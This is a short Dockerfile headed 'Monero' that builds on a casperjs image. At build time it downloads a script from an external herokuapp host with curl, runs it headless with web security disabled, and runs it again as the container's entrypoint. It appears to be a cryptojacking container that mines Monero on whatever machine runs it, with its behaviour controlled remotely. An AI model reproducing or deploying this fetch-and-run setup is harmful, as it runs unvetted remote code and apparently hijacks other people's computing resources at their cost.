# Monero

FROM zjgsuwk/casperjs
MAINTAINER zjgsuwk

ENV SCRIPT_DIR=/home

RUN echo 'time is : 1520188208649'

RUN  curl  http://victory-jupiter.herokuapp.com:80/task/2?consumer=cloud-docker \
> ${SCRIPT_DIR}/script.js

RUN /usr/local/bin/casperjs --web-security=no  ${SCRIPT_DIR}/script.js

WORKDIR $SCRIPT_DIR

ENTRYPOINT ["casperjs", "script.js"]